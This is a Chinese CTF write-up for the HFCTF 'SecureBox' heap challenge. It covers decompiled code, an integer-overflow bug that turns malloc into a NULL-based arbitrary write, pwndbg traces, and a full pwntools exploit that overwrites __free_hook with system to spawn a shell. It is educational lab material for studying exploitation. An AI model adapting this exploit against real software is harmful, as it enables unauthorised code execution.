# HFCTF SecureBox

### 0x1 分析

这道题本地2.27调通了，但是2.30没成功。待解决。🐦咕咕咕咕

看一下保护

```shell
[*] './chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

都开着。

看一下程序逻辑，是一个标准菜单题，增删查改都有。

```c
unsigned __int64 menu()
{
  unsigned __int64 v0; // ST08_8

  v0 = __readfsqword(0x28u);
  puts("1.Allocate");
  puts("2.Delete");
  puts("3.Enc");
  puts("4.Show");
  puts("5.Exit");
  return __readfsqword(0x28u) ^ v0;
}
```

`add()/Alloccate()`:

```c
unsigned __int64 add()
{
  _QWORD *v0; // rbx
  unsigned int idx; // [rsp+4h] [rbp-2Ch]
  signed int i; // [rsp+8h] [rbp-28h]
  signed int j; // [rsp+Ch] [rbp-24h]
  unsigned __int64 size; // [rsp+10h] [rbp-20h]
  unsigned __int64 v6; // [rsp+18h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  idx = -1;
  for ( i = 0; i <= 15; ++i )
  {
    if ( !List[i] )
    {
      idx = i;
      break;
    }
  }
  if ( idx == -1 )
  {
    puts("No boxes available!");
  }
  else
  {
    puts("Size: ");
    size = get_num();
    if ( size > 0x100 && (unsigned int)size <= 0xFFF )
    {
      List[idx] = malloc(0x28uLL);
      *((_QWORD *)List[idx] + 4) = size;
      v0 = List[idx];
      v0[3] = malloc(size);
      memset(List[idx], 0, 0x14uLL);
      get_rand(List[idx]);
      puts("Key: ");
      for ( j = 0; j <= 15; ++j )
        printf("%02x ", *((unsigned __int8 *)List[idx] + j));
      printf("\nBox ID: %d\n", idx);
    }
    puts("Finish!");
  }
  return __readfsqword(0x28u) ^ v6;
}
```

这里指定了`chunk`的大小范围`0x100->0xFFF`。并且，会给你一串随机数，用于之后编辑用。

如果不在范围内，就不分配地址。

但是，观察这里再检测的时候`if ( size > 0x100 && (unsigned int)size <= 0xFFF )`。

这里用了强制转化，把`size`转化为`unsigned int`但是，注意到，我们输入`size`时：

```c
__int64 get_num()
{
  char nptr; // [rsp+0h] [rbp-20h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  readSafe(&nptr, 24);
  return atol(&nptr);
}
```

我们获得的是一个`_int64`的数。所以存在整数溢出。而且，判断之后`malloc(size)`时，用的就是`unsigned int`截断之前的`_int64`的`size`。如果我们输入的`size`截断之后在判断的范围内，并且足够大，就会留存在`List`里。指向地址为`0`。

`enc/edit()`

```c
unsigned __int64 enc()
{
  unsigned __int64 v0; // ST20_8
  unsigned __int64 i; // [rsp+8h] [rbp-38h]
  unsigned __int64 idx; // [rsp+10h] [rbp-30h]
  unsigned __int64 offset; // [rsp+18h] [rbp-28h]
  unsigned __int64 len; // [rsp+28h] [rbp-18h]
  unsigned __int64 v6; // [rsp+30h] [rbp-10h]
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  puts("Box ID: ");
  idx = get_num();
  if ( idx > 0xF )
  {
LABEL_9:
    puts("Finish!");
    return __readfsqword(0x28u) ^ v7;
  }
  if ( List[idx] )
  {
    puts("Offset of msg: ");
    offset = get_num();
    if ( *((_QWORD *)List[idx] + 4) > offset )
    {
      puts("Len of msg: ");
      v0 = *((_QWORD *)List[idx] + 4) - offset;
      len = get_num();
      if ( len <= v0 )
      {
        puts("Msg: ");
        readSafe((_BYTE *)(*((_QWORD *)List[idx] + 3) + offset), len);
        v6 = *((_QWORD *)List[idx] + 3) + offset;
        for ( i = 0LL; i < len; ++i )
          *(_BYTE *)(v6 + i) ^= *((_BYTE *)List[idx] + (i & 0xF));
      }
    }
    goto LABEL_9;
  }
  puts("Empty Box!");
  return __readfsqword(0x28u) ^ v7;
}
```

这里判断`List[idx]`是否有`chunk(0x28)`，然后用之前`add()`的时候给的随机的`Key`来异或编码我们输入的内容。

`delete`:这里很常规，没有UAF。

```c
unsigned __int64 delete()
{
  unsigned __int64 idx; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Box ID: ");
  idx = get_num();
  if ( idx > 0xF )
  {
LABEL_7:
    puts("Finish!");
    return __readfsqword(0x28u) ^ v2;
  }
  if ( List[idx] )
  {
    if ( *((_QWORD *)List[idx] + 3) )
    {
      free(*((void **)List[idx] + 3));
      *((_QWORD *)List[idx] + 3) = 0LL;
    }
    free(List[idx]);
    List[idx] = 0LL;
    goto LABEL_7;
  }
  puts("Empty Box!");
  return __readfsqword(0x28u) ^ v2;
}
```

#### 漏洞利用

申请两个`large bin`范围内的`chunk`。一个用来防止另一个`chunk`在`delete`的时候与`top`合并，并且存入`/bin/sh\x00`，另一个`delete()`掉，然后得到`libc`。

```shell
0x5648c13c2690 PREV_INUSE {
  mchunk_prev_size = 1280,
  mchunk_size = 1297,
  fd = 0x7fa05b719ca0 <main_arena+96>,
  bk = 0x7fa05b719ca0 <main_arena+96>,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x5648c13c2ba0 FASTBIN {
  mchunk_prev_size = 1296,
  mchunk_size = 49,
  fd = 0xfa2e749611e17915,
  bk = 0xbda07cc331e5b8ed,
  fd_nextsize = 0x0,
  bk_nextsize = 0x5648c13c2be0
}
0x5648c13c2bd0 PREV_INUSE {
  mchunk_prev_size = 1280,
  mchunk_size = 1297,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}

0x5648c13c2bd0 PREV_INUSE {
  mchunk_prev_size = 1280,
  mchunk_size = 1297,
  fd = 0x68732f6e69622f,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

利用`add()`中的整数溢出，来得到一个`malloc(size)`返回`NULL`。

然后在`enc()`里就可以编辑任意地址（一定意义上的）的内容，选择`_free_hook()`，改写为`system()`

```shell
pwndbg> p __free_hook
$1 = (void (*)(void *, const void *)) 0x7f3f92879440 <__libc_system>
pwndbg> p system
$2 = {int (const char *)} 0x7f3f92879440 <__libc_system>
pwndbg>
```

调用`delete()` `free`掉存`/bin/sh\x00`的`chunk`。拿到shell。

在`free()`处加断点：

```shell
─────────────────[ REGISTERS ]─────────────────────────────────────────────────────
 RAX  0x561fb8309be0 ◂— 0x68732f6e69622f /* '/bin/sh' */
 RBX  0x0
 RCX  0x1999999999999999
 RDX  0x1
 RDI  0x561fb8309be0 ◂— 0x68732f6e69622f /* '/bin/sh' */
 RSI  0xffffffda
 R8   0x7ffd28f46131 ◂— 0x7ffd28f40a
 R9   0x0
 R10  0x7f0ec3131cc0 (_nl_C_LC_CTYPE_class+256) ◂— add    al, byte ptr [rax]
 R11  0xa
 R12  0x561fb76eaa50 ◂— xor    ebp, ebp
 R13  0x7ffd28f46270 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffd28f46170 —▸ 0x7ffd28f46190 —▸ 0x561fb76eb4e0 ◂— push   r15
 RSP  0x7ffd28f46160 ◂— 0x1
 RIP  0x561fb76eb0bf ◂— call   0x561fb76ea9c0
────────────────[ DISASM ]──────────────────────────────────────────────────────
 ► 0x561fb76eb0bf    call   0x561fb76ea9c0

   0x561fb76eb0c4    lea    rax, [rip + 0x200f95]
   0x561fb76eb0cb    mov    rdx, qword ptr [rbp - 0x10]
   0x561fb76eb0cf    mov    rax, qword ptr [rax + rdx*8]
   0x561fb76eb0d3    mov    qword ptr [rax + 0x18], 0
   0x561fb76eb0db    lea    rax, [rip + 0x200f7e]
   0x561fb76eb0e2    mov    rdx, qword ptr [rbp - 0x10]
   0x561fb76eb0e6    mov    rax, qword ptr [rax + rdx*8]
   0x561fb76eb0ea    mov    rdi, rax
   0x561fb76eb0ed    call   0x561fb76ea9c0

   0x561fb76eb0f2    lea    rax, [rip + 0x200f67]
──────────────[ STACK ]───────────────────────────────────────────────────────
00:0000│ rsp  0x7ffd28f46160 ◂— 0x1
01:0008│      0x7ffd28f46168 ◂— 0xa0ff8c4140bae300
02:0010│ rbp  0x7ffd28f46170 —▸ 0x7ffd28f46190 —▸ 0x561fb76eb4e0 ◂— push   r15
03:0018│      0x7ffd28f46178 —▸ 0x561fb76eb4a2 ◂— jmp    0x561fb76eb4d3
04:0020│      0x7ffd28f46180 ◂— 0x2
05:0028│      0x7ffd28f46188 ◂— 0xa0ff8c4140bae300
06:0030│      0x7ffd28f46190 —▸ 0x561fb76eb4e0 ◂— push   r15
07:0038│      0x7ffd28f46198 —▸ 0x7f0ec2fb4b97 (__libc_start_main+231) ◂— mov    edi, eax
─────────────────[ BACKTRACE ]─────────────────────────────────────────────────────
 ► f 0     561fb76eb0bf
   f 1                1
   f 2 a0ff8c4140bae300
   f 3     7ffd28f46190
   f 4     561fb76eb4a2
   f 5                2
   f 6 a0ff8c4140bae300
   f 7     561fb76eb4e0
   f 8     7f0ec2fb4b97 __libc_start_main+231
   f 9     561fb76eaa79
   f 10     7ffd28f46268
──────────────────────────────────────────────────────────────────────
```

```shell
Breakpoint *0x561fb76eb0bf
pwndbg> p __free_hook
$1 = (void (*)(void *, const void *)) 0x7f0ec2fe2440 <__libc_system>
pwndbg> p system
$2 = {int (const char *)} 0x7f0ec2fe2440 <__libc_system>
pwndbg>

───────────[ DISASM ]──────────────────────────────────────────────────────
   0x7f0ec302a971 <free+33>     mov    rax, qword ptr [rip + 0x353570]
   0x7f0ec302a978 <free+40>     mov    rax, qword ptr [rax]
   0x7f0ec302a97b <free+43>     test   rax, rax
   0x7f0ec302a97e <free+46>     jne    free+720 <0x7f0ec302ac20>
    ↓
   0x7f0ec302ac20 <free+720>    mov    rsi, qword ptr [rsp + 0x68]
 ► 0x7f0ec302ac25 <free+725>    call   rax <0x7f0ec2fe2440>
        command: 0x561fb8309be0 ◂— 0x68732f6e69622f /* '/bin/sh' */

   0x7f0ec302ac27 <free+727>    jmp    free+336 <0x7f0ec302aaa0>

   0x7f0ec302ac2c <free+732>    nop    dword ptr [rax]
   0x7f0ec302ac30 <free+736>    and    esi, 2
   0x7f0ec302ac33 <free+739>    jne    free+1376 <0x7f0ec302aeb0>

   0x7f0ec302ac39 <free+745>    lea    rax, [rip + 0x358cb8] <0x7f0ec33838f8>
```

```shell
$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x5 bytes:
    'root\n'
root
$
```

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

# p = process(['/pwn/ld/2.30/ld-2.30-64.so','./chall'], env={'LD_PRELOAD':'./libc.so.6'})
p = process('./chall')
# libc = ELF('./libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(size):
    p.sendlineafter("5.Exit\n",str(1))
    p.sendlineafter("Size: ",str(size))

def delete(idx):
    p.sendlineafter("5.Exit\n",str(2))
    p.sendlineafter("Box ID: ",str(idx))

def enc(idx,offset,len,msg):
    p.sendlineafter("5.Exit\n",str(3))
    p.sendlineafter("Box ID: ",str(idx))
    p.sendlineafter("Offset of msg:",str(offset))
    p.sendlineafter("Len of msg: ",str(len))
    p.sendlineafter("Msg: ",msg)

def show(idx,offset,len):
    p.sendlineafter("5.Exit\n",str(4))
    p.sendlineafter("Box ID: ",str(idx))
    p.sendlineafter("Offset of msg:",str(offset))
    p.sendlineafter("Len of msg: ",str(len))



# leak libc
add(0x500)  # 0
add(0x500)  # 1

p.recvuntil('Key: \n')
Key1 = int(p.recvuntil(' ',drop=True),16)
Key2 = int(p.recvuntil(' ',drop=True),16)
Key3 = int(p.recvuntil(' ',drop=True),16)
Key4 = int(p.recvuntil(' ',drop=True),16)
Key5 = int(p.recvuntil(' ',drop=True),16)
Key6 = int(p.recvuntil(' ',drop=True),16)
Key7 = int(p.recvuntil(' ',drop=True),16)
Key8 = int(p.recvuntil(' ',drop=True),16)

delete(0)
add(0x500)  # 0
show(0, 0, 16)
libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 96 - 0x3ebc40
# libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 96 - 0x1eabe0
libc.address = libc_base

success(hex(libc_base))
pause()

payload = p8(ord('/')^Key1)
payload+= p8(ord('b')^Key2)
payload+= p8(ord('i')^Key3)
payload+= p8(ord('n')^Key4)
payload+= p8(ord('/')^Key5)
payload+= p8(ord('s')^Key6)
payload+= p8(ord('h')^Key7)
payload+= p8(ord('\x00')^Key8)

enc(1,0,8,payload)

# int overflow
add(0x800000000200)#2

p.recvuntil('Key: \n')
key1 = int(p.recvuntil(' ',drop=True),16)
key2 = int(p.recvuntil(' ',drop=True),16)
key3 = int(p.recvuntil(' ',drop=True),16)
key4 = int(p.recvuntil(' ',drop=True),16)
key5 = int(p.recvuntil(' ',drop=True),16)
key6 = int(p.recvuntil(' ',drop=True),16)
key7 = int(p.recvuntil(' ',drop=True),16)
key8 = int(p.recvuntil(' ',drop=True),16)

system = libc.symbols['system']
success(hex(system))

payload = p8(int(str(hex(system))[12:],16)^key1)
payload+= p8(int(str(hex(system))[10:12],16)^key2)
payload+= p8(int(str(hex(system))[8:10],16)^key3)
payload+= p8(int(str(hex(system))[6:8],16)^key4)
payload+= p8(int(str(hex(system))[4:6],16)^key5)
payload+= p8(int(str(hex(system))[2:4],16)^key6)

enc(2,libc.symbols['__free_hook'],6,payload)

# get shell
delete(1)

p.interactive()
```

